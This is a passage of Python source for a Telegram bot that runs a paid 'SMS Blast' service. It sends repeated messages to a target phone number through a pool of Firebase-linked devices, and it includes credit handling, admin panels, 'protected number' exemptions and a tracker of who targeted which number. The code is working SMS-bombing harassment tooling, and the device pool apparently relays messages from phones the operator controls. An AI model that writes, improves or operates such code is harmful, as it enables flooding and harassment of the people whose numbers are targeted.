                                save(dt)
                        else:
                            sent_fail += 1; msgs_left -= 1
                        if fb_id not in api_usage_delta: api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                        api_usage_delta[fb_id]["sent" if ok else "failed"] += 1
                        now = time.time()
                        if (now - last_update >= _PROGRESS_UPDATE_INTERVAL or
                            (sent_ok + sent_fail) == count or session.cancelled):
                            cr = get_user_credits(uid, load()) if is_reg else None
                            try:
                                await pmsg.edit_text(progress_text(sent_ok, sent_fail, count, cr, lbl),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML")
                            except TelegramBadRequest: pass
                            last_update = now
                    await asyncio.sleep(speed)
        except Exception as e:
            log.error(f"Send loop error: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok; session.failed = sent_fail

    task = asyncio.create_task(do_send()); session.task = task
    await task
    was_cancelled = session.cancelled
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS: del USER_SESSIONS[uid]

    if not is_reg:
        df = load()
        df["stats"]["total_sent"] = df["stats"].get("total_sent", 0) + sent_ok
        df["stats"]["total_failed"] = df["stats"].get("total_failed", 0) + sent_fail
        for fid, delta in api_usage_delta.items():
            df["stats"].setdefault("api_usage", {}).setdefault(fid, {"sent": 0, "failed": 0})
            df["stats"]["api_usage"][fid]["sent"] += delta["sent"]
            df["stats"]["api_usage"][fid]["failed"] += delta["failed"]
        k = str(uid)
        if k in df["users"]:
            df["users"][k]["uses"] = df["users"][k].get("uses", 0) + sent_ok
        df.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number, "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"})
        save(df)
    else:
        df = load()
        df["stats"]["total_failed"] = df["stats"].get("total_failed", 0) + sent_fail
        for fid, delta in api_usage_delta.items():
            df["stats"].setdefault("api_usage", {}).setdefault(fid, {"sent": 0, "failed": 0})
            df["stats"]["api_usage"][fid]["failed"] += delta["failed"]
        save(df)

    d_log = load()
    duration = int(time.time() - start)
    log_activity(d_log, "sms_blast", uid, f"Sent: {sent_ok}, Failed: {sent_fail}, Dur: {fmt_duration(duration)}")
    save(d_log)

    try:
        uci = await bot.get_chat(uid)
        u_name = uci.full_name or "Unknown"
        u_uname = f"@{uci.username}" if uci.username else "No Username"
    except: u_name = "Unknown"; u_uname = "No Username"

    asyncio.create_task(send_channel_log(bot,
        f"🚀 <b>SMS BLAST LOG</b>\n\n👤 {u_name}\n🆔 <code>{uid}</code>\n🌐 {u_uname}\n"
        f"📞 <code>{number}</code>\n💬 <code>{message}</code>\n"
        f"✅ {sent_ok} ❌ {sent_fail} 📊 {count}\n⏱ {fmt_duration(duration)}\n"
        f"🛑 {'STOPPED' if was_cancelled else 'COMPLETED'}"))

    icon = em(EMOJI_CHECK, "✅") if sent_fail == 0 and sent_ok > 0 else em(EMOJI_WARNING, "⚠️") if sent_ok > 0 else em(EMOJI_CROSS, "❌")
    credit_text = ""
    if is_reg:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n{em(EMOJI_MONEY, '💰')} Used: <b>{sent_ok}</b>\n{em(EMOJI_MONEY, '💳')} Left: <b>{remaining}</b>"
    stopped_text = f"\n{em(EMOJI_CROSS, '🛑')} <b>User ne stop kiya!</b>" if was_cancelled else ""
    dur_text = f"\n{em(EMOJI_GEAR, '⏱')} Duration: <b>{fmt_duration(int(time.time() - start))}</b>"

    if is_owner(uid, load()):
        back = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙")]
    elif is_admin(uid, load()):
        back = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙")]
    else:
        back = [btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", EMOJI_ROCKET, "📤"),
                btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠")]

    try:
        await pmsg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
            f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_STAR, '💬')} Msg: <code>{message[:50]}{'...' if len(message)>50 else ''}</code>\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} APIs: <b>{len(api_usage_delta)}</b>"
            f"{dur_text}{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back]), parse_mode="HTML")
    except Exception as e:
        log.error(f"Final edit failed: {e}")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ Koi active sending nahi!", show_alert=True); return
        session.cancelled = True
    await cq.answer("🛑 Stop signal!", show_alert=True)
    try:
        async with session.lock:
            cs = session.sent; cf = session.failed
        await cq.message.edit_text(f"{em(EMOJI_CROSS, '🛑')} <b>Stopping...</b>\n✅ {cs}\n❌ {cf}", parse_mode="HTML")
    except: pass

# ═══════════════════════════════════════════════════════════════════
#  VIDEOS
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    vids = d.get("videos", [])
    await cq.message.edit_text(f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>\n\nTotal: <b>{len(vids)}</b>",
                                reply_markup=videos_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_video)
    await cq.message.edit_text(f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\nVideo bhejo:",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]), parse_mode="HTML")

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d): await state.clear(); return
    vid = None
    if msg.video: vid = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        vid = msg.document.file_id
    elif msg.text: vid = msg.text.strip()
    if not vid: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Video bhejo.", parse_mode="HTML"); return
    d.setdefault("videos", []).append(vid); save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Video Saved!</b>",
                     reply_markup=videos_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    vids = d.get("videos", [])
    if 0 <= idx < len(vids):
        vids.pop(idx); d["videos"] = vids; save(d); await cq.answer("🗑 Removed!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    d["videos"] = []; save(d); await cq.answer("🗑 All deleted!", show_alert=True)
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "user:random_video")
async def user_random_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not d.get("videos", []): await cq.answer("❌ No video!", show_alert=True); return
    await cq.answer("📹 Sending...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy!")

# ═══════════════════════════════════════════════════════════════════
#  PROTECT
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\nNumber bhejo:",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_owner(uid, d): await state.clear(); return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid."); return
    PROTECTED_NUMBERS[number] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS; save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Protected!</b>\n<code>{number}</code>",
                     reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    log_activity(d, "protect_number", uid, f"Protected {number}"); save(d)

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.message.edit_text(f"{em(EMOJI_LOCK, '🔐')} No protected numbers.",
                                    reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML"); return
    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected</b>\n"]
    is_owner_user = is_owner(uid, d)
    for number, puid in protected.items():
        disp = number if is_owner_user else mask_number(number)
        lines.append(f"📞 <code>{disp}</code> — by <code>{puid}</code>")
    rows = []
    if is_owner_user: rows.append([btn("ʀᴇᴍᴏᴠᴇ", "owner:protected_remove", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_owner(uid, d): await cq.answer("🚫", show_alert=True); return
    protected = d.get("protected_numbers", {})
    if not protected: await cq.answer("❌ No protected!", show_alert=True); return
    rows = []
    for number in protected: rows.append([btn(number, f"owner:protected_del:{number}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} <b>Remove</b>",
                                reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_owner(uid, d): await cq.answer("🚫", show_alert=True); return
    number = cq.data.split("owner:protected_del:", 1)[1]
    if number in d.get("protected_numbers", {}):
        del d["protected_numbers"][number]; save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer(f"✅ Removed!", show_alert=True)
    else:
        await cq.answer("❌ Not found!", show_alert=True)
    await owner_protected_list(cq, state)

# ═══════════════════════════════════════════════════════════════════
#  TRACK
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.track_number)
    await cq.message.edit_text(f"{em(EMOJI_STAR, '📊')} <b>Tracker</b>\n\nNumber:",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_owner(uid, d): await state.clear(); return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid."); return
    await state.clear()
    all_h = d.get("sms_history", {})
    users_who = []
    for uid_str, hist in all_h.items():
        for entry in hist:
            if entry.get("number") == number:
                ud = d.get("users", {}).get(uid_str, {})
                users_who.append({"uid": int(uid_str), "name": ud.get("name", "Unknown"),
                                   "ts": entry.get("timestamp", 0)})
                break
    if not users_who:
        await msg.answer(f"{em(EMOJI_STAR, '📊')} No users for <code>{number}</code>.",
                          reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML"); return
    lines = [f"{em(EMOJI_STAR, '📊')} <b>Tracker</b>\n📞 <code>{number}</code>\n"]
    for e in users_who:
        lines.append(f"• <code>{e['uid']}</code> — {e['name'][:20]} — {fmt_time(e['ts'])}")
    await msg.answer("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════
#  ADD / DEDUCT ALL
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>Add to ALL</b>\n\nKitne credits?",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.add_all_credits_amount)
async def owner_add_all_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_owner(uid, d): await state.clear(); return
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number."); return
    await state.clear()
    users = d.get("users", {})
    if not users: await msg.answer(f"{em(EMOJI_CROSS, '❌')} No users!"); return
    for uid_str in users: add_credits(int(uid_str), amount, d)
    save(d)
    success = 0
    notif = f"{em(EMOJI_MONEY, '💰')} <b>+{amount} credits!</b>"
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notif, parse_mode="HTML")
            success += 1; await asyncio.sleep(0.05)
        except: pass
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} +{amount} to {len(users)} (notified {success})",
                     reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    log_activity(d, "add_credits_all", uid, f"Added {amount} to {len(users)}"); save(d)

@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💰')} <b>Deduct from ALL</b>\n\nKitne?",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_owner(uid, d): await state.clear(); return
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number."); return
    await state.clear()
    users = d.get("users", {})
    if not users: await msg.answer(f"{em(EMOJI_CROSS, '❌')} No users!"); return
    count = 0; total = 0
    owners = d.get("owners", [MAIN_OWNER]); admins = d.get("admins", [])
    for uid_str, ud in users.items():
        u = int(uid_str)
        if u in owners or u in admins: continue
        cur = ud.get("credits", 0)
        if cur >= amount: ud["credits"] = cur - amount; count += 1; total += amount
        elif cur > 0: ud["credits"] = 0; count += 1; total += cur
    save(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Deducted!\n💰 {amount}\n👥 {count}\n💳 {total}",
                     reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    log_activity(d, "deduct_credits_all", uid, f"Deducted {total}"); save(d)

# ═══════════════════════════════════════════════════════════════════
#  TRANSFER
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if is_banned(uid, d) or not can_use(uid, d): await cq.answer("🚫", show_alert=True); return
    cur = get_user_credits(uid, d)
    if cur < 2: await cq.answer("❌ Min 2!", show_alert=True); return
    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(f"{em(EMOJI_MONEY, '💸')} <b>Transfer</b>\n💰 {cur}\n\nTarget ID:",
                                reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")

@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    try: target = int(msg.text.strip())
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID."); return
    if target == uid: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Apne aap ko nahi!"); return
    if str(target) not in d.get("users", {}): await msg.answer(f"{em(EMOJI_CROSS, '❌')} User nahi mila!"); return
    cur = get_user_credits(uid, d)
    if cur < 2: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Min 2!"); return
    await state.update_data(transfer_target=target)
    await state.set_state(S.transfer_credits_amount)
    half = cur // 2
    await msg.answer(f"{em(EMOJI_MONEY, '💸')} To: <code>{target}</code>\n💰 {cur}\n📤 Max: {half}\n\nAmount:",
                     reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")

@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    try:
        amount = int(msg.text.strip())
        if amount <= 0: raise ValueError
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid."); return
    fsmd = await state.get_data(); target = fsmd.get("transfer_target")
    cur = get_user_credits(uid, d); mx = cur // 2
    if amount > mx: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Max {mx}!"); return
    if not deduct_credits(uid, amount, d): await msg.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient!"); return
    add_credits(target, amount, d); save(d); await state.clear()
    try: await msg.bot.send_message(target,
        f"{em(EMOJI_MONEY, '💸')} <b>+{amount} from {uid}</b>", parse_mode="HTML")
    except: pass
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Transfer OK\nTo: {target}\n💰 {amount}\n💳 {get_user_credits(uid, d)}",
                     reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════
#  OWNER HOME / FIREBASE
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear(); d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    try: await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.clear()
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b>",
                                reply_markup=fb_menu_kb(d, page), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Add Firebase</b>\n\nURL bhejo:\n<i>Format: Label | URL</i>",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]), parse_mode="HTML")

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    if not is_owner(uid, d): await state.clear(); return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1); label = parts[0].strip(); url = parts[1].strip()
    else:
        url = text; label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"): await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with http"); return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already!", reply_markup=fb_menu_kb(d), parse_mode="HTML"); return
    fbs.append({"id": str(int(time.time())), "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs; save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Added!</b>\n{label}\n<code>{url}</code>",
                     reply_markup=fb_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add .txt</b>\n\nSend .txt file with URLs:",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]), parse_mode="HTML")

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    doc = msg.document
    if not doc.file_name.endswith(".txt"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Only .txt!"); return
    fi = await msg.bot.get_file(doc.file_id)
    dl = await msg.bot.download_file(fi.file_path)
    content = dl.read().decode("utf-8", errors="ignore")
    fbs = d.get("firebases", [])
    existing = {fb["url"].rstrip("/") for fb in fbs}
    added = 0; skipped = 0
    for line in content.splitlines():
        line = line.strip()
        if not line: continue
        if "|" in line:
            parts = line.split("|", 1); label = parts[0].strip(); url = parts[1].strip()
        else:
            url = line; label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]
        if not url.startswith("http"): continue
        url = url.rstrip("/")
        if url in existing: skipped += 1; continue
        existing.add(url)
        fbs.append({"id": str(int(time.time()*1000)+random.randint(100,999)),
                    "url": url, "label": label, "added_at": int(time.time())})
        added += 1
    d["firebases"] = fbs; save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Processed!</b>\nAdded: {added}\nSkipped: {skipped}\nTotal: {len(fbs)}",
                     reply_markup=fb_menu_kb(load()), parse_mode="HTML")

@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Send .txt!")

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    parts = cq.data.split(":")
    fb_id = parts[3]; page = int(parts[4]) if len(parts) > 4 else 0
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]; save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    d = load()
    await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
                                reply_markup=fb_menu_kb(d, page), parse_mode="HTML")

@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear(); d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await cq.answer("⏳ Fetching...")
    cur_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in cur_ids]
    for k in [k for k in FB_DEVICE_COUNTS if k not in cur_ids]: FB_DEVICE_COUNTS.pop(k, None)
    devices = get_cached_devices() or await get_all_online_devices(d)
    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online ({len(devices)})</b>\n"]
    for dv in devices[:30]:
        dev_lines.append(f"  {em(EMOJI_PHONE, '📱')} {dv['dev_name'][:20]} — {dv['fb_label'][:18]}")
    full = (stats_text + "\n" + "\n".join(dev_lines))[:4000]
    await cq.message.edit_text(full, reply_markup=kb([
        (f"{sc('refresh')}", "owner:stats"), (f"{sc('back')}", "owner:home")]), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════
#  OWNERS / ADMINS
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    owners = d.get("owners", [])
    await cq.message.edit_text(f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\nTotal: <b>{len(owners)}/6</b>",
                                reply_markup=owners_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    if len(d.get("owners", [])) >= 6: await cq.answer("❌ Max 6!", show_alert=True); return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nChat ID:",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]), parse_mode="HTML")

@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try: new_id = int(msg.text.strip())
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID."); return
    if is_owner(new_id, d):
        await state.clear(); await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already!",
                                                reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
    if len(d.get("owners", [])) >= 6:
        await state.clear(); await msg.answer(f"{em(EMOJI_CROSS, '❌')} Max 6!",
                                                reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
    d["owners"].append(new_id); save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Added! <code>{new_id}</code>",
                     reply_markup=owners_menu_kb(load()), parse_mode="HTML")
    try: await msg.bot.send_message(new_id, f"{em(EMOJI_CROWN, '🔱')} <b>You are Super Admin!</b>", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    if not is_owner(uid, d): await cq.answer("🚫", show_alert=True); return
    if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await cq.answer("❌ Main owner remove nahi!", show_alert=True); return
    if del_id in d["owners"]:
        d["owners"].remove(del_id); save(d); await cq.answer("🗑 Removed!")
    await cq.message.edit_text(f"{em(EMOJI_CROWN, '👑')} <b>Owners</b>\n\nTotal: <b>{len(d['owners'])}/6</b>",
                                reply_markup=owners_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    admins = d.get("admins", [])
    await cq.message.edit_text(f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(admins)}</b>",
                                reply_markup=admins_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nUser ID:",
                                reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]), parse_mode="HTML")

@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d): await state.clear(); return
    try: new_id = int(msg.text.strip())
    except: await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID."); return
    if new_id in d.get("admins", []) or is_owner(new_id, d):
        await state.clear(); await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already!",
                                                reply_markup=admins_menu_kb(d), parse_mode="HTML"); return
    d["admins"].append(new_id); save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Admin added! <code>{new_id}</code>",
                     reply_markup=admins_menu_kb(load()), parse_mode="HTML")
    try: await msg.bot.send_message(new_id, f"{em(EMOJI_SHIELD, '🛡')} <b>You are Admin!</b>", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    if not is_owner(uid, d): await cq.answer("🚫", show_alert=True); return
    if del_id in d.get("admins", []):
